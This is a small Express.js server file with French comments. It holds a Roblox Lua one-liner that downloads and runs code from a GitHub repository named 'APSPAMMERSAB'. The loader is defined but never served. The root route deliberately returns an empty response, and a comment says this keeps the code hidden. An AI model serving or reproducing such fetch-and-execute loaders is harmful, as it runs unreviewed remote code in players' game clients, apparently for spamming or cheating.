const express = require("express");
const app = express();
const port = process.env.PORT || 3000;

// Le script Lua à exécuter sur Roblox
const luaScript = `loadstring(game:HttpGet("https://raw.githubusercontent.com/plantapi662-lab/APSPAMMERSAB/refs/heads/main/W"))()`;

app.get("/", (req, res) => {
  // Renvoie une réponse vide ou "invisible" (ne pas exposer le code)
  res.type("text/plain");
  res.send("");  // Envoie une réponse vide ou cachée.
});

app.listen(port, () => console.log("Server running on port " + port));
